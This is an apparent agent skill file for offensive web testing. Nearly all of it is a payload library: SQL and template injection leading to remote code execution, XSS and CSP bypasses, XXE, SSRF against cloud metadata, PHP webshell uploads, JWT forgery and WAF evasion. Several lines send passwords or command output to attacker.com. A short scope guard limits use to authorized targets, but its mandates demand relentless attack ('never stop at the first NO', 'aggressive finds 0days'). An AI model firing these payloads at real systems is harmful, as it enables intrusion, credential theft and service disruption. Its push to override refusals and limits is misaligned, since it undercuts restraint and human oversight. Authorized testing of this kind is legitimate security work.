---
name: methos_full_vuln_engine
description: The ultimate vulnerability hunting engine — ALL classic bug classes (SSTI, XSS, XXE, SQLi, SSRF, RCE, deserialization, command injection, LDAP injection, XPath injection, template injection, proto pollution, race conditions, type juggling, cache poisoning, request smuggling, JWT attacks, GraphQL attacks, WebSocket attacks, postMessage attacks, CORS attacks, open redirect, IDOR, BOLA, mass assignment, file upload attacks, NoSQL injection, XML injection, CSV injection, host header injection, CRLF injection, HTTP parameter pollution, method override, content-type confusion, encoding bypasses, path traversal, LFI/RFI, XXE via PDF, SSRF via gopher, DNS rebinding, prototype pollution, AngularJS sandbox escape, polyglot payloads, WAF bypass techniques) tested with 2026-level creative approaches. Not a checklist — a generative attack force that invents novel payloads based on the target's unique tech stack. NEVER stop at the first NO.
---

# METHOS FULL VULN ENGINE — 2026 Creative Attack Force

## OVERRIDE (2026-09-29 — this beats the map and the five phases)
This file is a palette of shapes, not a sweep you run before thinking. Do not map every
input, then fire every payload. Replay the real client. Read the error class. Send the one
shape that class did not expect (encoding, case, type, omission, sibling key). A later
class on the same HTTP status is the bug. Pull a section below only when the class has
stopped moving, and pull one section, not the arsenal. At least 7 shots on that angle.
Own in-scope accounts only. The tenant-data line below still holds.

## THE MANDATE
Every input point. Every output context. Every parser. Every interpreter.
If the target touches it, you attack it. Creatively. Aggressively. Relentlessly.

The difference between 2016 testing and 2026 testing: we don't just try
`' OR 1=1--` anymore. We try polyglot payloads that work in 5 contexts
simultaneously. We abuse parser differentials. We weaponize type juggling.
We turn error messages into oracles. We chain "low" findings into P1s.

## WHERE THIS SKILL SITS (routing + discipline — read before firing)
This is the **deepest PAYLOAD LIBRARY** in the kit (the 2026 companion to `methos_engine`'s 80-angle
breadth). It is a library to fire FROM, not a checklist to run top-to-bottom.
- **Driver = `methos_generative_engine`**: deconstruct the target's architecture FIRST; it selects which
  arsenal sections are even reachable, then you fire those EXHAUSTIVELY. (SQLi at a route with no SQL sink
  is noise; the JWT arsenal at the one gateway that reaches the sig stage is signal.)
- **Instrument = `differential_oracle` (NON-NEGOTIABLE):** read every payload result by response CLASS, not
  the status code; and **positive-control every NEGATIVE on the SAME instrument** before trusting it.
  Examples that earned this rule: image-SSRF "all 400" is only real once `favicon → 200 image` proves the
  optimizer works; a reflected marker is only XSS once `<` survives RAW (not `<` inside `__NEXT_DATA__`);
  a forged JWT only tests the sig layer once `aud=courier` reaches it.
- **Barriers = `zero_day_mindset`** · **breadth palette = `methos_engine`** · **honest report = MYTHOS**.

**SCOPE GUARD (the aggression has exactly one limit).** "Aggressive / full-force" = 1000s of requests and
every payload class against **own / authorized-program** targets — NEVER another tenant's data, never a
session/credential that isn't yours, never mass-targeting outside an enrolled program. Only the human submits.
Within that line: full force. Across it: stop. (The MYTHOS tenant-data boundary; this arsenal does not override it.)

## THE UNIVERSAL ATTACK SURFACE MAP

Before attacking, map EVERYWHERE user input enters the target:

### Input Vectors (check ALL)
1. URL path (`/user/{input}`)
2. URL query parameters (`?id={input}`)
3. URL fragment (`#{input}` — sent to client, sometimes processed server-side)
4. POST body (JSON, XML, form-data, text/plain, multipart)
5. HTTP headers (every single one: Host, User-Agent, Referer, X-*, Authorization, Cookie, Origin, Content-Type, Accept)
6. Cookie values and cookie names
7. File upload (filename, content-type, file content, multipart boundary)
8. WebSocket messages
9. postMessage (cross-origin)
10. GraphQL queries, mutations, variables
11. gRPC/protobuf fields
12. Server-Sent Event channels
13. WebRTC data channels
14. DNS parameters (subdomain, SRV records if API uses them)
15. JWT claims (header + payload — every field)
16. OAuth state parameter, redirect_uri, scope
17. SAML assertions
18. OpenID Connect id_token
19. PDF metadata if PDF upload allowed
20. EXIF data if image upload allowed

### Output Contexts (where does input appear?)
1. HTML body (reflected, stored, DOM)
2. JavaScript context (`var x = '{input}'`)
3. HTML attribute (`<div class="{input}">`)
4. URL context (`<a href="{input}">`)
5. CSS context (`style="{input}"`)
6. Template context (`{{ {input} }}`)
7. SQL query (`SELECT * FROM users WHERE id = {input}`)
8. NoSQL query (`db.users.find({id: {input}})`)
9. XML document (XXE, XInclude)
10. JSON response (prototype pollution, JSON injection)
11. HTTP header value (CRLF, header injection)
12. HTTP redirect target (open redirect)
13. Error message (information disclosure, error-based extraction)
14. Log file (log injection, log poisoning)
15. Email body (email injection)
16. File path (LFI, RFI, path traversal)
17. Command line (command injection)
18. LDAP query (LDAP injection)
19. XPath query (XPath injection)
20. OS command (OS command injection)

## THE 2026 CREATIVE PAYLOAD ARSENAL

### 1. SQL INJECTION (2026 approach)

**Don't just try `' OR 1=1--`. Try:**

a) **Polyglot payloads** (work in multiple contexts):
```
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT @@version,2,3-- -
'; DROP TABLE users; --
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2
1" AND "1"="1
1') AND ('1'='1
1)) AND ((1=1
1 AND SLEEP(5)
1 AND pg_sleep(5)
1; WAITFOR DELAY '0:0:5'--
1 AND benchmark(10000000,md5(1))
```

b) **JSON-based SQLi** (modern APIs accept JSON):
```json
{"id": {"$gt": ""}}
{"id": {"$ne": null}}
{"id": "1' OR '1'='1"}
{"id": "1 UNION SELECT * FROM users--"}
```

c) **Blind SQLi via timing** (even without error output):
```
1 AND IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1) > 64, SLEEP(5), 0)
1 AND CASE WHEN (SELECT COUNT(*) FROM information_schema.tables) > 0 THEN pg_sleep(5) ELSE pg_sleep(0) END
```

d) **Second-order SQLi** (input stored, executed later):
```
Set username to: admin'-- 
Then login as: admin (the '-- comments out the password check)
```

e) **Out-of-band SQLi** (DNS/HTTP exfiltration):
```
1; COPY (SELECT password FROM users) TO PROGRAM 'curl https://attacker.com/?d=' || password--
1 AND LOAD_FILE(CONCAT('\\\\attacker.com\\', (SELECT password FROM users LIMIT 1), '.txt'))
```

f) **SQLite-specific** (mobile apps, embedded databases):
```
1 UNION SELECT sqlite_version(),sql FROM sqlite_master--
1 AND randomblob(1000000000) -- CPU DoS via SQLite
```

g) **NoSQL injection** (MongoDB, CouchDB, etc.):
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"$where": "this.password.length > 0"}
{"username": {"$regex": "admin.*"}}
```

### 2. SSTI — Server-Side Template Injection (2026 approach)

**Context-aware template detection:**

a) **Generic fuzzing** (works on most engines):
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
@(7*7)
#{7*7}
{{request}}
${T(java.lang.Runtime).getRuntime().exec('id')}
```

b) **Jinja2 (Python/Flask/Django)**:
```
{{config}}
{{self.__dict__}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['popen']('id').read()}}
{{url_for.__globals__['os'].popen('id').read()}}
{{request.application.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{cycler.__init__.__globals__['os'].popen('id').read()}}
{{joiner.__init__.__globals__['os'].popen('id').read()}}
{{namespace.__init__.__globals__['os'].popen('id').read()}}
```

c) **Twig (PHP/Symfony)**:
```
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('passthru')}}
```

d) **Freemarker (Java)**:
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

e) **Velocity (Java/Apache)**:
```
#set($e = " ")
#set($class = $e.getClass().forName("java.lang.Runtime"))
#set($runtime = $class.getRuntime())
$runtime.exec("id")
```

f) **Smarty (PHP)**:
```
{php}echo `id`;{/php}
{system('id')}
{shell_exec('id')}
```

g) **Handlebars/Mustache (Node.js)**:
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.constructor "fromCharCode")}}
      {{this.pop}}
      {{#with string.constructor.fromCharCode as |f|}}
        {{this.push "return process.mainModule.require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#with (apply this this) as |sh|}}
          {{sh}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

h) **Django Template**:
```
{% load %}{% debug %}
{% for x in user.get_all_permissions %}{{x}}{% endfor %}
{% with a=user.groups.all.0 %}{{ a }}{% endwith %}
```

i) **React/Vue/Angular SSR**:
```
<!-- React: escape to JS context -->
<div data-react-props='{"x": {"__proto__": {"polluted": true}}}'>
<!-- Vue: v-html injection -->
<div v-html="userInput"></div>
<!-- Angular: $parse sandbox escape -->
{{constructor.constructor('alert(1)')()}}
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
```

### 3. XSS — Cross-Site Scripting (2026 approach)

**Context-aware polyglot payloads:**

a) **HTML context**:
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<iframe src=javascript:alert(document.domain)>
<object data=javascript:alert(document.domain)>
```

b) **JavaScript context** (inside `<script>` tag):
```
';alert(document.domain);//
';alert(document.domain);'
";alert(document.domain);"
\\';alert(document.domain);//
${alert(document.domain)}
`alert(document.domain)`
```

c) **Attribute context**:
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
` onmouseover=`alert(1)
"> <img src=x onerror=alert(1)>
```

d) **Angular/React/Vue specific**:
```
{{constructor.constructor('alert(1)')()}}
{{_c0.constructor('alert(1)')()}}
[$event=>alert(1)]
(window:resize)="alert(1)"
```

e) **Prototype pollution → XSS**:
```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"onload": "alert(1)"}}
```

f) **DOM Clobbering → XSS**:
```html
<a id=x name=y href="javascript:alert(1)">
<form id=x><input name=action value=javascript:alert(1)>
```

g) **Mutation XSS** (sanitize → parse mismatch):
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
<svg></p><style><!--</style><img src=x onerror=alert(1)>--></style>
```

h) **CSP bypass techniques** (2026 arsenal):
```
<!-- JSONP endpoint abuse -->
<script src="/api/jsonp?callback=alert(1)"></script>
<!-- Angular CSP bypass -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.js"></script>
<div ng-app ng-csp ng-click=$event.view.alert(1)></div>
<!-- data: URI if allowed -->
<script src="data:text/javascript,alert(1)"></script>
<!-- unsafe-eval with function constructor -->
<script>'alert(1)'.replace(/.+/,eval)</script>
<!-- base-uri + relative script -->
<base href="https://attacker.com/">
<script src="/evil.js"></script>
```

### 4. XXE — XML External Entity (2026 approach)

**Beyond basic XXE — modern bypasses:**

a) **Classic XXE**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

b) **XXE via XInclude** (when direct DTD blocked):
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

c) **XXE via parameter entities** (blind XXE, OOB):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

d) **XXE via SVG upload**:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="file:///etc/passwd"/>
</svg>
```

e) **XXE via PDF upload** (PDF contains XML metadata):
```
%PDF-1.4
<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
<?xpacket end="w"?>
```

f) **XXE via Excel/OOXML upload** (.xlsx is ZIP containing XML):
```
[Content_Types].xml contains:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

g) **XXE via docx/pptx** (same ZIP/XML technique):
```
word/document.xml contains XXE payload
```

h) **XXE via SOAP**:
```xml
<soap:Body>
<foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<bar>&xxe;</bar>
</foo>
</soap:Body>
```

i) **Error-based XXE** (when OOB not possible):
```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
```

j) **XXE via gRPC/Protobuf** (some implementations parse XML):
```
When protobuf messages are serialized to XML for internal processing
```

### 5. COMMAND INJECTION / RCE (2026 approach)

a) **Classic command injection**:
```
; id
| id
`id`
$(id)
${IFS}id
${IFS}id${IFS}-u
\nid
```

b) **Blind command injection** (no output):
```
; curl https://attacker.com/$(whoami)
; sleep 5
; ping -c 5 attacker.com
```

c) **No-space command injection**:
```
{ls,-la}
cat</etc/passwd
IFS=,;id${IFS}-u
```

d) **Windows-specific**:
```
& whoami
| whoami
$(whoami)
`whoami`
%SYSTEMROOT%\system32\cmd.exe /c whoami
```

e) **Python code injection** (flask, django, eval):
```
__import__('os').popen('id').read()
__import__('subprocess').check_output('id',shell=True)
[].__class__.__base__.__subclasses__()[137](['id'])
```

f) **Node.js code injection**:
```
require('child_process').execSync('id').toString()
process.mainModule.require('child_process').exec('id').toString()
Function('require("child_process").execSync("id")')()
```

g) **Java code injection** (Runtime.exec):
```
${T(java.lang.Runtime).getRuntime().exec('id')}
#request.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```

h) **Deserialization → RCE**:
```
Java: ysoserial payloads (CommonsCollections, Spring, etc.)
Python: pickle.loads(malicious_pickle)
PHP: unserialize(malicious_object)
Node.js: node-serialize, serialize-to-js
Ruby: Marshal.load, YAML.load
```

i) **ImageMagick / PDF processing RCE**:
```
Upload SVG: <svg xmlns="http://www.w3.org/2000/svg">
<image href="https://attacker.com/x.jpg`id`"/>
</svg>
```

### 6. SSRF — Server-Side Request Forgery (2026 approach)

a) **Classic SSRF** (URL parameter):
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://192.0.0.254/computeMetadata/v1/
http://localhost:22/ (SSH banner PROGRAM_37)
http://localhost:8080/ (internal admin)
file:///etc/passwd
```

b) **SSRF via DNS rebinding**:
```
Set up DNS with TTL 0 that returns attacker IP first, then 169.254.169.254
Target fetches attacker.com → gets metadata IP on second resolve
```

c) **SSRF via PDF**:
```
<object data="http://169.254.169.254/latest/meta-data/">
```

d) **SSRF via SVG**:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
<image href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

e) **SSRF via gopher** (when HTTP blocked):
```
gopher://169.254.169.254:80/_GET%20/latest/meta-data/ HTTP/1.0
```

f) **SSRF via FTP**:
```
ftp://169.254.169.254/latest/meta-data/
```

g) **SSRF via dict**:
```
dict://169.254.169.254:80/
```

h) **SSRF via XSPA (cross-site port attack)**:
```
Use different ports: :22, :3306, :5432, :6379, :27017, :9200
Measure response time and content to map internal services
```

i) **SSRF via WebSocket upgrade**:
```
Connection: Upgrade
Upgrade: websocket
Host: 169.254.169.254
```

### 7. FILE UPLOAD ATTACKS (2026 approach)

a) **Extension bypass**:
```
shell.php.jpg
shell.php%00.jpg (null byte)
shell.pHp
shell.php5
shell.phtml
shell.shtml
shell.asp;.jpg
shell.aspx
shell.jsp
shell.jspx
shell.war
shell.cer
shell.cdx
```

b) **Content-Type bypass**:
```
Change Content-Type to: image/jpeg while uploading PHP
Use multipart with wrong content-type
```

c) **Magic bytes bypass**:
```
GIF89a<?php system($_GET['cmd']); ?>
\xFF\xD8\xFF<?php system($_GET['cmd']); ?>
```

d) **SVG → XSS/XXE**:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="file:///etc/passwd"/>
</svg>
```

e) **ZIP / Path traversal via upload**:
```
Upload ZIP containing: ../../../../../var/www/html/shell.php
Upload with filename: ../../../etc/cron.d/backdoor
```

f) **Polyglot files**:
```
A file that is simultaneously a valid JPEG, valid PHP, and valid HTML
```

g) **ImageTragick / Ghostscript RCE**:
```
Upload PDF with embedded payload for ImageMagick/Ghostscript
```

h) **Exif metadata injection**:
```
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 8. JWT ATTACKS (2026 approach)

a) **Algorithm confusion** (RSA key as HMAC secret):
```
Sign with HS256 using the RSA public key as HMAC secret
```

b) **alg:none**:
```json
{"alg": "none", "typ": "JWT"}
```

c) **JWK header injection**:
```json
{"alg": "RS256", "jwk": {"kty": "RSA", "n": "...", "e": "...", "d": "..."}}
```

d) **kid manipulation**:
```json
{"kid": "../../../dev/null", "alg": "HS256"}
{"kid": "", "alg": "HS256"}
{"kid": null, "alg": "HS256"}
```

e) **Elliptic Curve confusion**:
```json
{"alg": "ES256", "typ": "JWT"}
```

f) **JWT key ID confusion**:
```
Use kid from one service's JWKS with your forged token on another service
```

g) **Empty signature**:
```
Token with no signature (trailing dot)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMifQ.
```

h) **Nested JWT**:
```
JWT inside JWT — parser may verify outer, trust inner
```

i) **Octet Key Pair (OKP) confusion**:
```json
{"alg": "EdDSA", "crv": "Ed25519"}
```

### 9. PROTOCOL & INFRASTRUCTURE ATTACKS

a) **HTTP Request Smuggling**:
```
CL.TE: Content-Length and Transfer-Encoding conflict
TE.CL: Transfer-Encoding takes precedence
Content-Length: 0 with body
```

b) **HTTP/2 Downgrade**:
```
Force HTTP/2 → HTTP/1.1 conversion to bypass WAF
H2C smuggling (Upgrade: h2c)
```

c) **Host Header Injection**:
```
Host: attacker.com
X-Forwarded-Host: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
```

d) **Cache Poisoning**:
```
Use headers that affect cache key: X-Forwarded-Host, Accept-Language, User-Agent
Craft response that gets cached with XSS payload
```

e) **DNS Rebinding**:
```
Set DNS A record with TTL 0 to return attacker IP, then target IP
Browser resolves to attacker first, then target — bypasses SOP
```

f) **WebSocket Hijacking**:
```
Craft Origin header in WebSocket handshake
CSRF via WebSocket (no CSRF token check)
```

g) **GraphQL attacks**:
```
Introspection query to map schema
Query depth attack (deep nesting)
Query cost analysis bypass
Alias-based query batching
SQL injection via GraphQL variables
```

h) **CSP Bypass**:
```
Abuse allowed script-src domains
JSONP callback injection
AngularJS CSP bypass
```

i) **Race Conditions**:
```
Double-spend: two simultaneous purchase requests
Limit bypass: decrement counter race
TOCTOU: check-then-act race
```

j) **Prototype Pollution**:
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__": {"polluted": true}}
```

### 10. WAF BYPASS TECHNIQUES (2026 arsenal)

a) **Encoding bypass**:
```
URL encoding: %27%20%4F%52%20%31%3D%31
Double URL encoding: %2527
Unicode encoding: %u0027
UTF-8 overlong: %c0%27
HTML entities: &#39;
```

b) **Case variation**:
```
UnIoN SeLeCt
sELeCt
SeLeCt
```

c) **Comment injection**:
```
UN/**/ION/**/SELECT
```

d) **Whitespace alternatives**:
```
SELECT%0a*%0aFROM%0ausers
SELECT/*!50000*/*/**/FROM/**/users
```

e) **Fragmentation**:
```
Split attack across multiple requests
Use HTTP/2 multiplexing to reassemble
```

f) **Oversized payload**:
```
Some WAFs skip body checks on requests > 1MB
```

g) **Content-Type confusion**:
```
Send XML payload with Content-Type: application/json
Send JSON in multipart/form-data
```

## THE EXECUTION PROTOCOL

For EVERY target, execute in this order:

### Phase 1: Reconnaissance (understand the target)
1. Map technology stack (framework, language, libraries, versions)
2. Map all input vectors (list every place user input can enter)
3. Map all output contexts (list every place input is reflected/processed)
4. Identify all parsers/interpreters (SQL engine, template engine, XML parser, JSON parser)

### Phase 2: Attack Surface Testing
For EACH input vector × EACH output context:
1. Try ALL relevant payloads from the arsenal above
2. Use content-differential analysis (with vs without payload)
3. Use timing analysis (delay = vulnerability)
4. Use error analysis (different error = different parser behavior)
5. For each partial result: generate 3 follow-up probes

### Phase 3: Creative Chaining
1. Combine low findings into medium impact
2. Combine medium findings into high impact
3. Chain information disclosure with injection → RCE
4. Chain auth bypass with IDOR → BOLA
5. Chain SSRF with cloud metadata → credential theft

### Phase 4: Adaptation
1. Every result teaches you about the target's defenses
2. Adapt payloads based on what you learned
3. If WAF blocks: try WAF bypass section
4. If one parser is secure: try a different parser on the same input
5. NEVER declare a vector dead without trying 10 distinct approaches

### Phase 5: Persistence
1. Document EVERY payload tried and its result
2. Document what was learned about target defenses
3. Store successful payloads for reuse
4. Write the full report with chain of findings

## THE CREATIVE MANDATES

1. **NEVER use the same payload twice** — adapt based on the target
2. **ALWAYS try the unexpected** — if everyone tries XSS in HTML, try it in a PDF
3. **ALWAYS combine vectors** — SSTI + XXE, SSRF + deserialization, XSS + CSRF
4. **THE WAF IS PART OF THE TARGET** — bypass it, don't avoid it
5. **EVERY PARSER IS A TARGET** — SQL, template, XML, JSON, LDAP, XPath, command
6. **ALWAYS measure side channels** — timing, errors, cache behavior
7. **IF YOU HAVEN'T TRIED 100 PAYLOADS, YOU HAVEN'T TRIED**
8. **THE TARGET'S UNIQUE ARCHITECTURE IS YOUR WEAPON** — abuse what makes it special
9. **NEVER STOP AT THE FIRST NO** — every rejection is data
10. **2026 CREATIVITY MEANS: POLYGLOT, PARSER DIFFERENTIALS, TYPE JUGGLING, ABUSE OF MODERN FRAMEWORKS**

## ANTI-PATTERNS DESTROYED
- "I tried SQLi and it didn't work" → try 50 more SQLi payloads
- "The WAF blocked me" → the WAF is your new target
- "That's not a vulnerability class for this target" → every target has every bug
- "I already tested that input" → test it with a different payload type
- "The framework is secure" → no framework is secure against creativity
- "I need a tool" → write the tool
- "That's too aggressive" → aggressive finds 0days
